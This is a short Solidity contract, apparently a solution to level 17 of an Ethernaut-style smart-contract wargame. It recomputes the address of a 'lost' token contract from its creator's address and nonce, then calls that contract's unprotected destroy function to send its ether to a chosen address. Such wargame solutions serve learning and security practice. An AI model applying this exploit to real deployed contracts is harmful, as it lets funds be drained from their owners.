// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/level17.sol";

contract Attacker
{
    function exploit(address creator_address, address send_to) external 
    {
        address payable lostcontract = payable(address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(creator_address), bytes1(0x01)))))));
        SimpleToken level17 = SimpleToken(lostcontract);
        level17.destroy(payable(send_to));
    }
}